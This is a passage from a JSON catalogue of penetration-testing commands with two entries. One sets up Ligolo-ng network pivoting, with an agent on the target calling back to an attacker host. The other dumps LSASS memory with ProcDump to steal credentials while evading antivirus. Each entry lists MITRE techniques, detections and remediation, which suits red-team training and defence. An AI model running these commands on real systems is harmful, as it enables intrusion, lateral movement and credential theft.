[
  {
    "id": "ligolo-setup",
    "tool": "ligolo-ng",
    "category": "post_exploitation",
    "phase": 6,
    "os": [
      "linux",
      "windows"
    ],
    "command": "# Proxy (attacker): sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up\n# Start: ligolo-proxy -selfcert\n# Agent: ligolo-agent -connect <attacker>:11601 -ignore-cert",
    "name": "Ligolo-ng Full Setup",
    "description": "Complete Ligolo-ng setup for transparent network pivoting \u2014 no SOCKS needed.",
    "arguments": {
      "ip tuntap add": "Create TUN interface",
      "ligolo-proxy": "Start proxy",
      "ligolo-agent": "Run on target"
    },
    "expected_output": "[+] Agent joined: agent@target\n>> session\n>> ifconfig\n>> start",
    "use_case": "Best pivoting tool \u2014 adds target's network as a route, no proxychains needed.",
    "prerequisites": [
      "TUN interface support",
      "Agent on target"
    ],
    "mitre_mapping": [
      "T1572"
    ],
    "mitre_tactic": "Command and Control",
    "detections": [
      "TLS connections to unusual ports",
      "New network routes"
    ],
    "remediation": [
      "Egress filtering",
      "Monitor for tunneling"
    ],
    "common_mistakes": [
      "Not adding route (ip route add <net> dev ligolo)"
    ],
    "alternatives": [
      "chisel",
      "ssh -D"
    ],
    "references": [
      "https://github.com/nicocha30/ligolo-ng"
    ],
    "tags": [
      "ligolo",
      "pivoting",
      "transparent",
      "tunnel",
      "setup"
    ]
  },
  {
    "id": "procdump-lsass",
    "tool": "procdump",
    "category": "post_exploitation",
    "phase": 6,
    "os": [
      "windows"
    ],
    "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
    "name": "Dump LSASS with ProcDump",
    "description": "Uses Microsoft's legitimate ProcDump to dump LSASS memory \u2014 less likely to be flagged by AV.",
    "arguments": {
      "-accepteula": "Accept EULA",
      "-ma": "Full memory dump",
      "lsass.exe": "Target process"
    },
    "expected_output": "[*] Dump 1 initiated: lsass.dmp\n[*] Dump 1 complete: 45 MB written",
    "use_case": "Dump LSASS using a signed Microsoft tool \u2014 bypasses some AV/EDR.",
    "prerequisites": [
      "Admin/SYSTEM privileges",
      "ProcDump on target"
    ],
    "mitre_mapping": [
      "T1003.001"
    ],
    "mitre_tactic": "Credential Access",
    "detections": [
      "LSASS memory access",
      "ProcDump execution"
    ],
    "remediation": [
      "Credential Guard",
      "PPL for LSASS",
      "Monitor LSASS access"
    ],
    "common_mistakes": [
      "Credential Guard enabled",
      "EDR still detects"
    ],
    "alternatives": [
      "comsvcs.dll MiniDump",
      "nanodump",
      "pypykatz (parse offline)"
    ],
    "references": [
      "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
    ],
    "tags": [
      "lsass",
      "dump",
      "procdump",
      "credentials",
      "evasion"
    ]
  },
